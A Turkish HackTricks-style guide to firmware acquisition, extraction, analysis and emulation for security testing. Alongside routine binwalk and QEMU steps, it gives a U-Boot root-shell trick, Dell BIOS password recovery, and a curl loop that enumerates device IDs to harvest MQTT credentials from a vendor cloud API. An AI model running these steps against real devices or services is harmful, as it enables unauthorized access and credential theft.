# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

Açıkta kalan donanım arayüzlerinden edinme için [UART konsolu yardımıyla firmware dökümü alma](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) ve [SPI flash dökümü alma](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) bölümlerine bakın. Konsola erişmeden önce önyükleme sırasında tekrarlanabilir bir UART yakalaması için [SCPI ile kontrol edilen güç kaynağı ve osiloskop kullanarak veri edinme](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) bölümüne bakın.

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşim kurduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların düzgün çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz, açıldığı andan itibaren hayati talimatlara erişebilir ve işletim sistemini başlatabilir. Güvenlik açıklarını belirlemede firmware'i incelemek ve olası değişiklikleri yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamak için kritik bir ilk adımdır. Bu süreçte aşağıdakilere ilişkin veriler toplanır:

- CPU mimarisi ve üzerinde çalıştığı işletim sistemi
- Önyükleyiciye ilişkin ayrıntılar
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve düzenleyici sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **açık kaynak istihbaratı (OSINT)** araçları ve mevcut açık kaynaklı yazılım bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi çok değerlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware'i Edinme**

Firmware'i edinmek için farklı yöntemler kullanılabilir; her birinin karmaşıklık düzeyi farklıdır:

- Kaynaktan **doğrudan** (geliştiricilerden, üreticilerden)
- Sağlanan talimatları izleyerek **derleme**
- Resmî destek sitelerinden **indirme**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage** alanlarına doğrudan erişme
- Ortadaki adam teknikleriyle **güncellemeleri** yakalama
- **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkarma**
- Cihaz iletişimi içindeki güncelleme isteklerini **dinleme**
- **Sabit kodlanmış güncelleme uç noktalarını** belirleme ve kullanma
- Önyükleyiciden veya ağ üzerinden **döküm alma**
- Diğer yöntemler başarısız olduğunda uygun donanım araçlarını kullanarak depolama yongasını **çıkarma ve okuma**

### Yalnızca UART logları: flash'taki U-Boot ortamını değiştirerek root shell'i zorla başlatma

UART RX yok sayılıyorsa (yalnızca loglar alınıyorsa), yine de **U-Boot ortam blob'unu** çevrimdışı düzenleyerek bir init shell'i zorla başlatabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcı (3,3 V) kullanarak SPI flash dökümü alın:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env bölümünü bulun, `bootargs` değerine `init=/bin/sh` ekleyin ve blob için **U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env bölümünü yeniden flash'layıp yeniden başlatın; UART üzerinden bir shell açılmalıdır.

Bu yöntem, bootloader shell'inin devre dışı bırakıldığı ancak env bölümünün harici flash erişimiyle yazılabildiği gömülü cihazlarda kullanışlıdır.

### Firewall kopyalama görevi aracılığıyla korumalı kodun açığa çıkarılması

Bazı MCU'lar, korumasız uygulama kodunun korumalı Flash'ı doğrudan okumak yerine korumalı bölge gateway'ini çağırmasına izin verir. Uygulama kodu yürütme yetkisi elde ettikten sonra, her gateway görevini ayrı bir bellek aktarım primitive'i olarak inceleyin. Cypherock X1 örneğinde STM32L4 Firewall call gate; bir görev, harici bir `data` işaretçisi, uzunluk ve korumalı bir `address` kabul ediyordu. Bir yazma görevi, Firewall Code içindeki bir `data` kaynak işaretçisini reddetmiyordu. Çağıran kod bu kodu doğrudan okuyamıyordu; ancak gateway, kodu izin verilen bir okuma görevinin açığa çıkardığı korumalı kalıcı olmayan depolama alanına kopyalayabiliyordu.<sup>[[15]](#references)</sup>

Bu tür bir açığı yeniden oluşturmak için, karşılık gelen bir okuma görevi olan yazılabilir bir korumalı depolama sayfası belirleyin, yazma kaynağını art arda gelen korumalı kod adreslerine ayarlayın ve hazırlanan baytları geri okuyun. Yazma işlemlerini tekrarlamadan önce depolama ortamını kontrol edin: bu örnekte ortam Flash'tı, bu yüzden sayfanın yeniden kullanımdan önce silinmesi gerekiyordu. Araştırmacılar, geçerli Secure Data Storage içeriğini silip geri yükleyen bir rutin kullandı; ardından cüzdan verilerinin üzerine yazmak yerine kalan boş alana kod hazırladı. Bunun için MCU'da kod yürütme yetkisi ve erişilebilir bir call gate gerekir; kimliği doğrulanmamış bir host'tan doğrudan okuma atlatması değildir.<sup>[[15]](#references)</sup>

Kurtarılan kod, [firmware güncelleme ve boot bütünlüğüyle ilgili güven boşluklarını](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata) açığa çıkarabilir.<sup>[[15]](#references)</sup>

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza** göre, onu nasıl ele alacağınızı belirlemek için firmware'den bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz çeşitli araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile görüntünün **entropisini** kontrol edin; entropi düşükse görüntünün şifrelenmiş olması olası değildir. Entropi yüksekse görüntünün şifrelenmiş (veya bir şekilde sıkıştırılmış) olması olasıdır.

Ayrıca, **firmware içine gömülü dosyaları** çıkarmak için bu araçları kullanabilirsiniz:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) aracını da kullanabilirsiniz.

### Harici flash bellekteki ham görüntü varlıkları

Harici bir SPI dökümü, MCU'nun çalıştırılabilir firmware'i olmak zorunda değildir. Cortex-M hedefi için, olası kod bölgelerinin başlangıcını cihazın bellek haritasıyla karşılaştırın: normal bir vektör tablosu, makul bir SRAM yığın işaretçisiyle ve çalıştırılabilir bellekte bulunan bir reset işleyicisi adresiyle başlar. Sıfır ofsetinde vektör tablosunun bulunmaması, tek başına tüm yongada kod olmadığını kanıtlamaz; diğer ofsetleri ve önyükleme düzenini inceleyin. `binwalk` herhangi bir kapsayıcı bulamazsa ham baytları inceleyin ve [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) içindeki flash okuma adreslerini yeni ekranları yükleyen eylemlerle ilişkilendirin.<sup>[[14]](#references)</sup>

Görüntü varlıklarının bulunduğu bir bölge için PNG/JPEG olduğunu varsaymak yerine olası piksel biçimlerini ve boyutlarını deneyin. Atıfta bulunulan cihazda **80×160 RGB565 little-endian** kareler kullanılmıştı: piksel başına iki baytla bir kare **25.600 bayttır** (25 KiB), 24 kilobit değil. Kod çözülmüş bir flash okuma adresi, ekran varlığının ofsetini belirledi; araştırmacı hazırlanmış bir görüntüyü `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` ile dönüştürdü, özgün dökümde aynı boyuttaki varlığı değiştirdi, `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` komutuyla yazdı ve yeni görüntünün ekranda gösterildiğini doğruladı. Bu, MCU'nun dahili firmware'inin çıkarıldığını veya yeniden flash edildiğini değil, *harici ekran varlıklarının yazılabilir* olduğunu gösterir. Herhangi bir yazma işleminden önce özgün dökümü saklayın; boyutları, bayt sırasını, ofseti ve değiştirme uzunluğunu doğrulayın.<sup>[[14]](#references)</sup>

### Diferansiyel flash analizi ve kurtarılabilir XOR gizli depoları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa, önce birbiriyle eşleşen birkaç flash okuması alın, **yalnızca** bir ayarı değiştirin, yonganın tamamını yeniden dökümleyin ve ofsetleri karşılaştırın. Kontrollü değerlerle deneyi tekrarlamak, ayarın sayaçlardan ve yazma meta verilerinden ayırt edilmesini sağlar; yerinde değişiklik yerine yeni ofsetlerde değişiklik görülmesi, yalnızca sona eklemeli veya günlük yapılı bir depolamaya işaret eder. Silinmiş/iptal edilmiş girdileri saklayın; yük verileri hâlâ kurtarılabilir olabilir.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Bölgeyi bulduktan sonra, `binwalk` gibi araçlarla firmware modüllerini çıkarın ve writer/validator'ı Ghidra'da tersine mühendislikle inceleyin. Şemayı yalnızca ciphertext kalıplarından çıkarsamak yerine, alan sınırlarını, padding'i, key indexing'i ve key derivation'ı kodda doğrulayın.<sup>[[12]](#references)</sup>

#### Şifrelenmiş sıfır padding'den key'leri kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen plaintext aynı offset'lerdeki keystream byte'larını ortaya çıkarır. Sabit boyutlu bir alan, sıfır padding'i tekrarlanan bir XOR key'in her index'ini kapsadığında özellikle savunmasızdır: şifrelenmiş padding, key byte'larını doğrudan açığa çıkarır; çünkü `0x00 XOR key_byte = key_byte`. Her key index'i kapsanıyorsa, ciphertext'in son kısmından key'i yeniden oluşturup doldurulmuş byte'ların şifresini çözün.<sup>[[12]](#references)</sup>

Dell'in savunmasız DVAR BIOS-password formatı somut bir örnektir: 32 byte'lık bir alanın `0` numaralı byte'ı plaintext iken, `1..31` byte'ları 20 byte'lık tekrarlanan bir key kullanır.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Parola uzunluğu `L` olduğunda, XOR'dan önce `L..31` konumları sıfırdı. `L <= 12` olduğunda, bu konumlar tüm anahtar indekslerini kapsar; böylece anahtarın tamamı ve parola brute force olmadan kurtarılır:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Geçmiş kayıtlardan anahtarları çıkarın

Her kaydı bağımsız olarak analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: device seed ve GUID sabittir; parolaya bağlı tek girdi, açık ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olabileceği ve aynı baytla başlayan kayıtların aynı anahtarı paylaşacağı anlamına gelir. Aktif ve silinmiş kayıtları bu bayta göre gruplayın; kısa bir geçmiş kaydı, padding aracılığıyla tam anahtarı açığa çıkarabilir ve padding'i yetersiz olan güncel, daha uzun bir kaydın şifresini çözebilir. Bu nedenle parola rotasyonu, eski ciphertext silinmek yerine tombstone olarak işaretlendiğinde maruziyeti artırabilir.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve ham saklanan/anahtar baytlarını görüntüleyebilir. Aracı bir checkout üzerinden derleyin ve doğrulanmış bir flash imajını aşağıdaki gibi tarayın:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel parser'larda kayıt yapısı, yazdırılabilir karakter kısıtlamaları, sıfır dolgusu kontrolleri, anahtar entropisi ve anahtarın döngü yaptığı konumlardaki tutarlılığı kullanarak yanlış pozitifleri reddedin. Tekrarlanan dump'larda yazma başına seyrek bit değişimleri görülüyorsa, gözlemlenen maskeleri listeleyin ve bu kısıtlamalara göre düzeltmeleri sıralayın; ancak sezgisel çıktıyı kesin kurtarma sonucu olarak sunmak yerine belirsiz karakterleri belirtin.<sup>[[12]](#references)</sup>

Parola doğrulayıcıları, geri çözülebilir şifreli metin yerine salt eklenmiş, yinelemeli tek yönlü hash saklamalı; log yapılı depolar ise önceki gizli materyali güvenli biçimde kaldırmalıdır.<sup>[[12]](#references)</sup>

### Dosya Sistemini Alma

Yukarıda açıklanan `binwalk -ev <bin>` gibi araçları kullandıysanız, **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini, dosya sistemi türünün adıyla anılan bir **klasörün** içine çıkarır. Bu ad genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Manuel Olarak Çıkarma

Bazen binwalk, dosya sisteminin magic byte değerini imzaları arasında **bulundurmaz**. Bu durumlarda, dosya sisteminin ofsetini bulmak ve sıkıştırılmış dosya sistemini ikili dosyadan carve etmek için binwalk kullanın; ardından aşağıdaki adımları izleyerek dosya sistemi türüne göre **manuel olarak çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd command** komutunu çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Bölünmüş embedded root dosya sistemlerini yeniden oluşturma

Ham bir eMMC/SSD dökümü geçerli bir dosya sistemi başlığı içeriyor ancak metadata offset'leri nominal bölümün ötesine uzanıyorsa, dosya sistemini hemen bozuk olarak sınıflandırmayın. Embedded boot kodu, Device Mapper ile birden fazla fiziksel aralığı birleştirerek gerçek root device'ı oluşturabilir; bu nedenle tek bir GPT bölümünden veri çıkarmak yalnızca ilk segmenti verir.<sup>[[9]](#references)</sup>

#### Tüm medya imajını triyaj etme

Öncelikle edinim işleminin tamamlandığını, boyutun sabit olduğunu ve hiçbir yazıcının imajı hâlâ kullanmadığını doğrulayın. Dosya adı bir başlangıç/bitiş adresi içeriyorsa bu aralığı gerçek bayt sayısıyla karşılaştırın. GPT'yi salt okunur modda kurtarın ve yalnızca gerekli aralığı bağlayın; iş istasyonunda güvenilmeyen bir fiziksel volume üzerinde `vgchange -ay` çalıştırmayın, çünkü volume group çakışmaları ve istenmeyen yazma işlemleri gerçekleşebilir.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Orijinal init mantığının veya bir LVM yığınının tüm imajı görmesi gerekiyorsa, atılabilir bir VM kullanın. Standart bir önyükleme bölümündeki geçmiş önyükleme günlükleri özellikle yararlıdır: bootloader, özel kapsayıcıdaki ofsetleri, bileşen uzunluklarını, slot seçimini, hizalama kurallarını ve imza doğrulamasını günlüğe kaydetmiş olabilir. Gömülü komut satırını/kernel/initramfs’i bu değerleri kullanarak ayıklayın, ardından her çıktıyı `file`, magic byte’lar ve `binwalk` ile ayrı ayrı doğrulayın; kapsayıcının sonuna kadar okumak, kernel’in sonuna yanlışlıkla bir initrd, ACPI nesnesi veya imza eklenmesine neden olabilir.<sup>[[9]](#references)</sup>

#### Önyükleme sırasındaki blok eşlemesini kurtarın

Kernel’in initramfs’ini çıkarın ve `/init` ile depolama kitaplıklarının tersine mühendisliğini yapın. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) bölümünde `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` ve bölüm yollarına yapılan string referanslarını izleyin; ardından etkin A/B slotunu seçen ve tabloyu oluşturan kodun izini sürün. radare2 için kullanışlı başlangıç noktaları: `r2 -A init`, `afl`, `pdf @ main` ve `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

linear target, sanal bir aygıtın ardışık aralıklarını bir veya daha fazla arka uç aygıtındaki aralıklara eşler. Kurtarılan iki segmentli bir tablo genellikle şu şekildedir (tüm konumlar ve uzunluklar 512 baytlık sektörler cinsindendir):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Makine kodu aritmetiğini tamsayı genişliği, kaydırmalar ve birim dönüşümleri dahil olmak üzere aynen yeniden üretin. Örneğin, aşağıdaki ifade bir bayt boyutunu önce 4-KiB sınırına aşağı yuvarlar, ancak ondan sonra 512 baytlık sektörlere dönüştürür; bunu `p4_bytes // 512` ile değiştirmek, bölüm sayfa hizalı olmadığında seçilen kuyruğu `p4_bytes % 4096` kadar kaydırır.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tablodaki aralıkları, medya dökümünün tamamını belleğe yüklemek yerine sınırlı parçalar halinde tablo sırasına göre kopyalayarak düz bir analiz imajı oluşturun. Bu, host tarafında mapper aygıtları oluşturulmasını da önler. GPT'den elde edilen offset değerlerini, ters çevrilmiş sektör sayılarını ve ortaya çıkan çıktı uzunluğunu ayrı assertions olarak tutun.<sup>[[9]](#references)</sup>

#### Bozulmayı sabit bir yeniden oluşturma hatasından ayırt edin

SquashFS için `unsquashfs` çalıştırmadan önce `hsqs` magic değerini kontrol edin ve superblock içindeki 40. offset'te bulunan little-endian 64-bit `bytes_used` alanını decode edin. Birbirinden bağımsız birkaç yapıda çıkarma işlemi başarısız olursa, beklenen konumların çevresindeki geniş bir aralığı tarayın ve güçlü yapısal adaylar arayın: decompress edilebilen bir metadata bloğu, art arda gelen birkaç geçerli dizin girdisi, makul inode alanları, inode sayısıyla tutarlı bir root inode veya geçerli bir integrity-metadata yapısı. Tek bir magic eşleşmesi yeterli değildir.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Aynı signed delta bağımsız yapıları (örneğin dizin metadata'sını ve bir verity kaydını) geçerli kılıyorsa, olası neden eksik baytlar değil, sistematik bir segment başlangıcı hatasıdır. Yetim kurtarma veya dosya sistemi metadata'sını yamalama girişiminden önce, ters çevrilmiş aritmetiğe dönün ve atılan kalanları, signedness'ı, taşmayı veya sektör/sayfa yuvarlamasını inceleyin.<sup>[[9]](#references)</sup>

Son olarak, koruma sınırlarını birbirinden ayrı tutun: TPM-sealed LUKS birimleri veri gizliliğini korurken, imzalı bir dm-verity eşlemesi kök dosya sistemi bütünlüğünü korur. Bir yazılım TPM'si, özgün fiziksel TPM'ye mühürlenmiş bir anahtarı kurtaramaz; verity doğrulamasını atlayan, yalnızca araştırma amaçlı bir init üzerinden değiştirilmiş bir SquashFS'i başlatmak da imzasını taklit etmez veya dm-verity'yi bozmaz.<sup>[[9]](#references)</sup>

## Firmware'i Analiz Etme

Firmware elde edildikten sonra yapısını ve olası güvenlik açıklarını anlamak için firmware'i incelemek gerekir. Bu süreç, firmware imajını analiz etmek ve içinden değerli veriler çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

Ek firmware-analysis araçları ve okumalar için [Third-Party Tools and Resources içindeki firmware bölümüne](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware) bakın.

İkili dosyanın (bundan böyle `<bin>` olarak anılacaktır) ilk incelemesi için bir dizi komut sunulmuştur. Bu komutlar dosya türlerini belirlemeye, dizeleri çıkarmaya, ikili verileri analiz etmeye, bölüm ve dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` komutuyla **entropi** kontrol edilir. Düşük entropi, şifreleme olmadığını; yüksek entropi ise olası şifreleme veya sıkıştırmayı gösterir.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** belgeleri ve dosya incelemesi için **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` komutuyla genellikle dosya sistemi çıkarılabilir; çoğunlukla dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, eksik magic bytes nedeniyle dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin offset'i bulunur, ardından dosya sistemini ayıklamak için `dd` komutu kullanılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içeriği manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon’ları, sabit kodlanmış kimlik bilgileri, API endpoint’leri, güncelleme sunucusu işlevleri, derlenmemiş kodlar, başlangıç betikleri ve çevrimdışı analiz için derlenmiş ikili dosyalar incelenir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- Daha ayrıntılı analiz için gömülü ikili dosyalar
- Yaygın IoT cihazı web sunucuları ve ikili dosyaları

Dosya sistemindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya yardımcı olan çeşitli araçlar vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kod hem de derlenmiş ikili dosyalar güvenlik açıkları açısından incelenmelidir. Unix ikili dosyaları için **checksec.sh**, Windows ikili dosyaları için **PESecurity** gibi araçlar, istismar edilebilecek korumasız ikili dosyaları belirlemeye yardımcı olur.

## Türetilmiş URL token’ları üzerinden bulut yapılandırmasını ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub’ı, cihaza özel yapılandırmasını şu biçimdeki bir bulut endpoint’inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında, `<token>` değerinin cihaz kimliğinden sabit kodlanmış bir gizli anahtar kullanılarak yerel olarak türetildiğini görebilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Bu tasarım, bir deviceId ve STATIC_KEY değerlerini öğrenen herkesin URL’yi yeniden oluşturup bulut yapılandırmasını almasına olanak tanır. Bu yapılandırma genellikle düz metin MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) UART önyükleme günlüklerinden deviceId değerini çıkarın

- 3.3V UART adaptörünü (TX/RX/GND) bağlayıp günlükleri yakalayın:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Bulut yapılandırma URL'si kalıbını ve broker adresini yazdıran satırları arayın; örneğin:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Bellenimden STATIC_KEY'i ve token algoritmasını kurtarma

- Binary dosyaları Ghidra/radare2'ye yükleyin ve yapılandırma yolunu ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (örn. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve özeti büyük harfe dönüştürün:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Bulut yapılandırmasını ve MQTT kimlik bilgilerini topla

- URL'yi oluşturup curl ile JSON'u çekin; sırları çıkarmak için jq ile ayrıştırın:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Düz metin MQTT'yi ve zayıf topic ACL'lerini (varsa) kötüye kullanın

- Kurtarılan kimlik bilgilerini kullanarak bakım topic'lerine abone olun ve hassas olayları arayın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Öngörülebilir cihaz kimliklerini listeleyin (ölçekli ve yetkilendirmeyle)

- Birçok ekosistem, vendor OUI/ürün/tür byte’larını ardışık bir sonek ile birleştirir.
- Aday kimlikleri sırayla deneyebilir, token’lar türetebilir ve config’leri programatik olarak alabilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu numaralandırma girişiminde bulunmadan önce daima açık yetki alın.
- Mümkün olduğunda hedef donanımı değiştirmeden sırları elde etmek için emülasyonu veya statik analizi tercih edin.


Firmware'i emüle etme süreci, bir cihazın işleyişinin veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım, donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'i veya belirli binary dosyalarını Raspberry Pi gibi mimarisi ve endianness değeri eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary Dosyalarını Emüle Etme

Tek programları incelerken, programın endianness değerini ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisi için bir binary dosyasını emüle etmek üzere şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Ve gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) için `qemu-mips` kullanılır; little-endian ikililer içinse `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM ikilileri için süreç benzerdir; emülasyonda `qemu-arm` emülatörü kullanılır.

### Full System Emulation

